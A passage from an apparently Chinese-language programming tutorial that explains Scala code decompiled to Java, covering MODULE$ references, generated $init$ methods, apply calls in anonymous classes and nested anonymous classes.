<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#75715e">//decompiled from PackageObject.class</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">package</span> org.example;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> org.example.package.;
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> scala.reflect.ScalaSignature;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">@ScalaSignature</span>(
</span></span><span style="display:flex;"><span>   bytes <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;ignored&#34;</span>
</span></span><span style="display:flex;"><span>)
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">class</span> <span style="color:#a6e22e">PackageObject</span> {
</span></span><span style="display:flex;"><span>   <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">packageGreet</span>() {
</span></span><span style="display:flex;"><span>      .<span style="color:#a6e22e">MODULE$</span>.<span style="color:#a6e22e">greetExample</span>();
</span></span><span style="display:flex;"><span>      org.<span style="color:#a6e22e">example</span>.<span style="color:#a6e22e">testPackage</span>.<span style="color:#a6e22e">package</span>..<span style="color:#a6e22e">MODULE$</span>.<span style="color:#a6e22e">greetTest</span>();
</span></span><span style="display:flex;"><span>   }
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>观察上文反编译代码，有两个问题需要回答。其一，<code>greetExample</code>这个方法来自哪里，为何通过<code>IDEA</code>不能进行索引跳转； 其二，<code>.MODULE$</code>到底是什么变量，为何在代码中没有任何的声明。</p>
<p>初看<code>.MODULE$.greetExample();</code>是一个有些奇怪的用法，语句竟然以<code>.</code>开头，不过如果将<code>import org.example.package.;</code>与之连接得到<code>org.example.package..MODULE$.greetExample();</code>，这样就与下一行中<code>org.example.testPackage.package..MODULE$.greetTest();</code>的调用方式一样， 于是情况似乎变得合理起来。</p>
<p>同时，一个新的情况出现了，看如下代码：</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-scala" data-lang="scala"><span style="display:flex;"><span><span style="color:#66d9ef">import</span> scala.Predef.<span style="color:#f92672">;</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">.</span><span style="color:#a6e22e">MODULE</span>$<span style="color:#f92672">.</span>println<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;我来自Predef伴生对象&#34;</span><span style="color:#f92672">)</span>
</span></span></code></pre></div><p>在<code>Scala</code>包下，<code>Predef</code> 是一个伴生对象，但其并不是包对象，为何其也通过<code>.MODULE$</code>变量来引用方法？</p>
<p>其实包导入末尾的<code>.</code>表示导入当前对象中的所有静态成员，而<code>Predef</code>又是伴生对象，同时其<code>Module$</code>变量也是静态成员，加之在导入位置也可能存在静态成员<code>MODULE$</code> 故使用<code>.MODULE$</code>加以区分。</p>
<h3 id="23-初始化代码">2.3 初始化代码<a hidden class="anchor" aria-hidden="true" href="#23-初始化代码">#</a></h3>
<blockquote>
<p>本节将涉及方法<code>$init$</code>的含义</p>
</blockquote>
<p>有代码如下：</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-scala" data-lang="scala"><span style="display:flex;"><span><span style="color:#66d9ef">package</span> org.example
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">StaticCode</span><span style="color:#f92672">{</span>
</span></span><span style="display:flex;"><span>  println<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;我是类主体代码&#34;</span><span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>  <span style="color:#f92672">{</span>
</span></span><span style="display:flex;"><span>   print<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;我时初始化代码块&#34;</span><span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>  <span style="color:#f92672">}</span>
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">var</span> code <span style="color:#66d9ef">=</span> <span style="color:#f92672">{</span>
</span></span><span style="display:flex;"><span>   print<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;我是变量初始化代码&#34;</span><span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>  <span style="color:#f92672">}</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">}</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">object</span> <span style="color:#a6e22e">StaticCode</span> <span style="color:#f92672">{</span>
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">def</span> main<span style="color:#f92672">(</span>args<span style="color:#66d9ef">:</span> <span style="color:#66d9ef">Array</span><span style="color:#f92672">[</span><span style="color:#66d9ef">String</span><span style="color:#f92672">])</span><span style="color:#66d9ef">:</span> <span style="color:#66d9ef">Unit</span> <span style="color:#f92672">=</span> <span style="color:#f92672">{</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">var</span> sc<span style="color:#66d9ef">:</span> <span style="color:#66d9ef">StaticCode</span> <span style="color:#f92672">=</span>  <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">StaticCode</span><span style="color:#f92672">()</span>
</span></span><span style="display:flex;"><span>    println<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;Hello&#34;</span><span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>  <span style="color:#f92672">}</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">}</span>
</span></span></code></pre></div><p>其反编译为<code>Java</code>代码后，若类主体、变量初始化代码、类初始化代码块中存在较为复杂的逻辑，<code>Scala</code>编译器将自动生成名为<code>$init$</code>的方法。</p>
<p>另一种情况，若父类存在类主体，则类主体中的代码将被组合为<code>$init$</code>方法。</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-scala" data-lang="scala"><span style="display:flex;"><span><span style="color:#66d9ef">package</span> org.example
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">trait</span> <span style="color:#a6e22e">Nested</span><span style="color:#f92672">{</span>
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">var</span> s<span style="color:#66d9ef">:</span> <span style="color:#66d9ef">String</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;我是嵌套特质&#34;</span>
</span></span><span style="display:flex;"><span>  println<span style="color:#f92672">(</span>s<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">}</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">ClassNested</span> <span style="color:#66d9ef">extends</span> <span style="color:#a6e22e">Nested</span> <span style="color:#f92672">{</span>
</span></span><span style="display:flex;"><span>  println<span style="color:#f92672">(</span>s<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">}</span>
</span></span></code></pre></div><p>反编译后结果如下：</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#f92672">package</span> org.example;
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> scala.Predef.;
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> scala.reflect.ScalaSignature;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">@ScalaSignature</span>(
</span></span><span style="display:flex;"><span>   bytes <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;ignored&#34;</span>
</span></span><span style="display:flex;"><span>)
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">interface</span> <span style="color:#a6e22e">Nested</span> {
</span></span><span style="display:flex;"><span>   String <span style="color:#a6e22e">s</span>();
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>   <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">s_$eq</span>(<span style="color:#66d9ef">final</span> String x$1);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>   <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">$init$</span>(<span style="color:#66d9ef">final</span> Nested $this) {
</span></span><span style="display:flex;"><span>      $this.<span style="color:#a6e22e">s_$eq</span>(<span style="color:#e6db74">&#34;我是嵌套特质&#34;</span>);
</span></span><span style="display:flex;"><span>      .<span style="color:#a6e22e">MODULE$</span>.<span style="color:#a6e22e">println</span>($this.<span style="color:#a6e22e">s</span>());
</span></span><span style="display:flex;"><span>   }
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#f92672">package</span> org.example;
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> scala.reflect.ScalaSignature;
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">@ScalaSignature</span>(
</span></span><span style="display:flex;"><span>   bytes <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;ignored&#34;</span>
</span></span><span style="display:flex;"><span>)
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">class</span> <span style="color:#a6e22e">ClassNested</span> <span style="color:#66d9ef">implements</span> Nested {
</span></span><span style="display:flex;"><span>   <span style="color:#66d9ef">private</span> String s;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>   <span style="color:#66d9ef">public</span> String <span style="color:#a6e22e">s</span>() {
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">s</span>;
</span></span><span style="display:flex;"><span>   }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>   <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">s_$eq</span>(<span style="color:#66d9ef">final</span> String x$1) {
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">s</span> <span style="color:#f92672">=</span> x$1;
</span></span><span style="display:flex;"><span>   }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>   <span style="color:#66d9ef">public</span> <span style="color:#a6e22e">ClassNested</span>() {
</span></span><span style="display:flex;"><span>      Nested.<span style="color:#a6e22e">$init$</span>(<span style="color:#66d9ef">this</span>);
</span></span><span style="display:flex;"><span>   }
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>在<code>ClassNested</code>的无参构造方法中调用了接口（特质）的<code>$init$</code>方法，而<code>$init$</code>方法则封装了特质的类主体逻辑。</p>
<h3 id="24-传参匿名类">2.4 传参匿名类<a hidden class="anchor" aria-hidden="true" href="#24-传参匿名类">#</a></h3>
<blockquote>
<p>本节将涉及<code>apply</code>方法</p>
</blockquote>
<p>以下是一个需要传参的匿名类：</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-scala" data-lang="scala"><span style="display:flex;"><span><span style="color:#66d9ef">package</span> org.example
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">object</span> <span style="color:#a6e22e">AnonymousClass</span> <span style="color:#f92672">{</span>
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">def</span> main<span style="color:#f92672">(</span>args<span style="color:#66d9ef">:</span> <span style="color:#66d9ef">Array</span><span style="color:#f92672">[</span><span style="color:#66d9ef">String</span><span style="color:#f92672">])</span><span style="color:#66d9ef">:</span> <span style="color:#66d9ef">Unit</span> <span style="color:#f92672">=</span> <span style="color:#f92672">{</span>
</span></span><span style="display:flex;"><span>   <span style="color:#75715e">// runnable类型为Function1
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#66d9ef">val</span> runnable <span style="color:#66d9ef">=</span> <span style="color:#66d9ef">new</span> <span style="color:#f92672">(</span><span style="color:#a6e22e">String</span> <span style="color:#66d9ef">=&gt;</span> <span style="color:#a6e22e">Unit</span><span style="color:#f92672">)</span> <span style="color:#f92672">{</span>
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">var</span> name<span style="color:#66d9ef">:</span> <span style="color:#66d9ef">String</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">override</span> <span style="color:#66d9ef">def</span> apply<span style="color:#f92672">(</span>name<span style="color:#66d9ef">:</span> <span style="color:#66d9ef">String</span><span style="color:#f92672">)</span><span style="color:#66d9ef">:</span> <span style="color:#66d9ef">Unit</span> <span style="color:#f92672">=</span> <span style="color:#f92672">{</span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">this</span><span style="color:#f92672">.</span>name <span style="color:#66d9ef">=</span> name
</span></span><span style="display:flex;"><span>      <span style="color:#f92672">}</span>
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">def</span> whoami<span style="color:#f92672">()</span><span style="color:#66d9ef">:</span> <span style="color:#66d9ef">Unit</span> <span style="color:#f92672">=</span> <span style="color:#f92672">{</span>
</span></span><span style="display:flex;"><span>        println<span style="color:#f92672">(</span>name<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>      <span style="color:#f92672">}</span>
</span></span><span style="display:flex;"><span>      <span style="color:#f92672">}</span>
</span></span><span style="display:flex;"><span>   <span style="color:#75715e">// 使用Function1 类的注入器进行传参
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    runnable<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;alis&#34;</span><span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// 调用方法
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    runnable<span style="color:#f92672">.</span>whoami<span style="color:#f92672">()</span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">}</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">}</span>
</span></span></code></pre></div><p>反编译后的代码如下：</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#75715e">//Source code recreated by IntelliJ IDEA</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">// (powered by FernFlower decompiler)</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">//</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">//decompiled from AnonymousClass.class</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">package</span> org.example;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> scala.reflect.ScalaSignature;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">@ScalaSignature</span>(
</span></span><span style="display:flex;"><span>   bytes <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;ignored&#34;</span>
</span></span><span style="display:flex;"><span>)
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">final</span> <span style="color:#66d9ef">class</span> <span style="color:#a6e22e">AnonymousClass</span> {
</span></span><span style="display:flex;"><span>   <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">main</span>(<span style="color:#66d9ef">final</span> String<span style="color:#f92672">[]</span> args) {
</span></span><span style="display:flex;"><span>      AnonymousClass$.<span style="color:#a6e22e">MODULE$</span>.<span style="color:#a6e22e">main</span>(args);
</span></span><span style="display:flex;"><span>   }
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">//decompiled from AnonymousClass$.class</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">package</span> org.example;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> java.lang.reflect.InvocationTargetException;
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> java.lang.reflect.Method;
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> scala.Function1;
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> scala.runtime.BoxedUnit;
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> scala.runtime.StructuralCallSite;
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> scala.runtime.ScalaRunTime.;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">final</span> <span style="color:#66d9ef">class</span> <span style="color:#a6e22e">AnonymousClass$</span> {
</span></span><span style="display:flex;"><span>   <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">static</span> AnonymousClass$ MODULE$;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>   <span style="color:#66d9ef">static</span> {
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">new</span> AnonymousClass$();
</span></span><span style="display:flex;"><span>   }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>   <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">static</span> Method <span style="color:#a6e22e">reflMethod$Method1</span>(<span style="color:#66d9ef">final</span> Class x$1) {
</span></span><span style="display:flex;"><span>      StructuralCallSite methodCache1 <span style="color:#f92672">=</span> apply<span style="color:#f92672">&lt;</span>invokedynamic<span style="color:#f92672">&gt;</span>();
</span></span><span style="display:flex;"><span>      Method method1 <span style="color:#f92672">=</span> methodCache1.<span style="color:#a6e22e">find</span>(x$1);
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">if</span> (method1 <span style="color:#f92672">!=</span> <span style="color:#66d9ef">null</span>) {
</span></span><span style="display:flex;"><span>         <span style="color:#66d9ef">return</span> method1;
</span></span><span style="display:flex;"><span>      } <span style="color:#66d9ef">else</span> {
</span></span><span style="display:flex;"><span>         method1 <span style="color:#f92672">=</span> .<span style="color:#a6e22e">MODULE$</span>.<span style="color:#a6e22e">ensureAccessible</span>(x$1.<span style="color:#a6e22e">getMethod</span>(<span style="color:#e6db74">&#34;whoami&#34;</span>, methodCache1.<span style="color:#a6e22e">parameterTypes</span>()));
</span></span><span style="display:flex;"><span>         methodCache1.<span style="color:#a6e22e">add</span>(x$1, method1);
</span></span><span style="display:flex;"><span>         <span style="color:#66d9ef">return</span> method1;
</span></span><span style="display:flex;"><span>      }
</span></span><span style="display:flex;"><span>   }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>   <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">main</span>(<span style="color:#66d9ef">final</span> String<span style="color:#f92672">[]</span> args) {
</span></span><span style="display:flex;"><span>      Function1 runnable <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> Function1() {
</span></span><span style="display:flex;"><span>         <span style="color:#66d9ef">private</span> String name;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>         <span style="color:#75715e">// $FF: synthetic method</span>
</span></span><span style="display:flex;"><span>         <span style="color:#75715e">// $FF: bridge method</span>
</span></span><span style="display:flex;"><span>         ...
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>         <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">apply</span>(<span style="color:#66d9ef">final</span> String name) {
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">name_$eq</span>(name);
</span></span><span style="display:flex;"><span>         }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>         <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">whoami</span>() {
</span></span><span style="display:flex;"><span>            scala.<span style="color:#a6e22e">Predef</span>..<span style="color:#a6e22e">MODULE$</span>.<span style="color:#a6e22e">println</span>(<span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">name</span>());
</span></span><span style="display:flex;"><span>         }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>         <span style="color:#75715e">// $FF: synthetic method</span>
</span></span><span style="display:flex;"><span>         <span style="color:#75715e">// $FF: bridge method</span>
</span></span><span style="display:flex;"><span>         <span style="color:#66d9ef">public</span> Object <span style="color:#a6e22e">apply</span>(<span style="color:#66d9ef">final</span> Object v1) {
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">apply</span>((String)v1);
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> BoxedUnit.<span style="color:#a6e22e">UNIT</span>;
</span></span><span style="display:flex;"><span>         }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>         <span style="color:#66d9ef">public</span> {
</span></span><span style="display:flex;"><span>            <span style="color:#75715e">// 上节提到的$init$方法 完成对象的初始化操作</span>
</span></span><span style="display:flex;"><span>            Function1.<span style="color:#a6e22e">$init$</span>(<span style="color:#66d9ef">this</span>);
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">name</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>;
</span></span><span style="display:flex;"><span>         }
</span></span><span style="display:flex;"><span>      };
</span></span><span style="display:flex;"><span>      runnable.<span style="color:#a6e22e">apply</span>(<span style="color:#e6db74">&#34;alis&#34;</span>);
</span></span><span style="display:flex;"><span>      Function1 qual1 <span style="color:#f92672">=</span> runnable;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">try</span> {
</span></span><span style="display:flex;"><span>         reflMethod$Method1(qual1.<span style="color:#a6e22e">getClass</span>()).<span style="color:#a6e22e">invoke</span>(qual1);
</span></span><span style="display:flex;"><span>      } <span style="color:#66d9ef">catch</span> (InvocationTargetException var5) {
</span></span><span style="display:flex;"><span>         <span style="color:#66d9ef">throw</span> var5.<span style="color:#a6e22e">getCause</span>();
</span></span><span style="display:flex;"><span>      }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>      BoxedUnit var10000 <span style="color:#f92672">=</span> BoxedUnit.<span style="color:#a6e22e">UNIT</span>;
</span></span><span style="display:flex;"><span>   }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>   <span style="color:#66d9ef">private</span> <span style="color:#a6e22e">AnonymousClass$</span>() {
</span></span><span style="display:flex;"><span>      MODULE$ <span style="color:#f92672">=</span> <span style="color:#66d9ef">this</span>;
</span></span><span style="display:flex;"><span>   }
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>在伴生对象的<code>main</code>方法中，首先构造了一个<code>Function1</code>类型的匿名类对象<code>runnable</code>，创建匿名类后调用其<code>apply</code>方法（注入器）进行传参，如此便完成了有参匿名类的实例化，然后通过反射进行方法调用。匿名类、匿名函数的传参、调用大量使用了<code>apply</code>方法，要加以甄别。</p>
<h3 id="25-类嵌套">2.5 类嵌套<a hidden class="anchor" aria-hidden="true" href="#25-类嵌套">#</a></h3>
<blockquote>
<p>本节将涉及变量<code>$outer</code>的含义</p>
</blockquote>
<p>有如下代码：</p>
<p>匿名类<code>a</code>中嵌套匿名类<code>b</code>，在嵌套匿名类<code>b</code>中调用外部类<code>a</code>的方法。</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-scala" data-lang="scala"><span style="display:flex;"><span><span style="color:#66d9ef">package</span> org.example
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">object</span> <span style="color:#a6e22e">AnonymousNested</span> <span style="color:#f92672">{</span>
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">def</span> main<span style="color:#f92672">(</span>args<span style="color:#66d9ef">:</span> <span style="color:#66d9ef">Array</span><span style="color:#f92672">[</span><span style="color:#66d9ef">String</span><span style="color:#f92672">])</span><span style="color:#66d9ef">:</span> <span style="color:#66d9ef">Unit</span> <span style="color:#f92672">=</span> <span style="color:#f92672">{</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">val</span> a <span style="color:#66d9ef">=new</span> <span style="color:#a6e22e">Object</span> <span style="color:#f92672">{</span>
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">val</span> b <span style="color:#66d9ef">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">Object</span> <span style="color:#f92672">{</span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">def</span> printHelloNested<span style="color:#f92672">()</span><span style="color:#66d9ef">:</span> <span style="color:#66d9ef">Unit</span> <span style="color:#f92672">=</span> <span style="color:#f92672">{</span>
</span></span><span style="display:flex;"><span>          printHello<span style="color:#f92672">()</span>
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">}</span>
</span></span><span style="display:flex;"><span>      <span style="color:#f92672">}</span>
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">def</span> printHello<span style="color:#f92672">()</span><span style="color:#66d9ef">:</span> <span style="color:#66d9ef">Unit</span> <span style="color:#f92672">=</span> <span style="color:#f92672">{</span>
</span></span><span style="display:flex;"><span>        println<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;Hello&#34;</span><span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>      <span style="color:#f92672">}</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">}</span>
</span></span><span style="display:flex;"><span>    a<span style="color:#f92672">.</span>b<span style="color:#f92672">.</span>printHelloNested<span style="color:#f92672">()</span>
</span></span><span style="display:flex;"><span>  <span style="color:#f92672">}</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">}</span>
</span></span></code></pre></div><p>将上文代码反编译为<code>Java</code>代码：</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#75715e">//decompiled from AnonymousNested.class</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">@ScalaSignature</span>(
</span></span><span style="display:flex;"><span>   bytes <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;ignored&#34;</span>
</span></span><span style="display:flex;"><span>)
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">final</span> <span style="color:#66d9ef">class</span> <span style="color:#a6e22e">AnonymousNested</span> {
</span></span><span style="display:flex;"><span>   <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">main</span>(<span style="color:#66d9ef">final</span> String<span style="color:#f92672">[]</span> args) {
</span></span><span style="display:flex;"><span>      AnonymousNested$.<span style="color:#a6e22e">MODULE$</span>.<span style="color:#a6e22e">main</span>(args);
</span></span><span style="display:flex;"><span>   }
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">//decompiled from AnonymousNested$.class</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">final</span> <span style="color:#66d9ef">class</span> <span style="color:#a6e22e">AnonymousNested$</span> {
</span></span><span style="display:flex;"><span>   <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">static</span> AnonymousNested$ MODULE$;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>   <span style="color:#66d9ef">static</span> {
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">new</span> AnonymousNested$();
</span></span><span style="display:flex;"><span>   }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>   <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">static</span> Method <span style="color:#a6e22e">reflMethod$Method1</span>(<span style="color:#66d9ef">final</span> Class x$1) {
</span></span><span style="display:flex;"><span>      StructuralCallSite methodCache1 <span style="color:#f92672">=</span> apply<span style="color:#f92672">&lt;</span>invokedynamic<span style="color:#f92672">&gt;</span>();
</span></span><span style="display:flex;"><span>      Method method1 <span style="color:#f92672">=</span> methodCache1.<span style="color:#a6e22e">find</span>(x$1);
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">if</span> (method1 <span style="color:#f92672">!=</span> <span style="color:#66d9ef">null</span>) {
</span></span><span style="display:flex;"><span>         <span style="color:#66d9ef">return</span> method1;
</span></span><span style="display:flex;"><span>      } <span style="color:#66d9ef">else</span> {
</span></span><span style="display:flex;"><span>         method1 <span style="color:#f92672">=</span> .<span style="color:#a6e22e">MODULE$</span>.<span style="color:#a6e22e">ensureAccessible</span>(x$1.<span style="color:#a6e22e">getMethod</span>(<span style="color:#e6db74">&#34;printHelloNested&#34;</span>, methodCache1.<span style="color:#a6e22e">parameterTypes</span>()));
</span></span><span style="display:flex;"><span>         methodCache1.<span style="color:#a6e22e">add</span>(x$1, method1);
</span></span><span style="display:flex;"><span>         <span style="color:#66d9ef">return</span> method1;
</span></span><span style="display:flex;"><span>      }
</span></span><span style="display:flex;"><span>   }
</span></span><span style="display:flex;"><span>
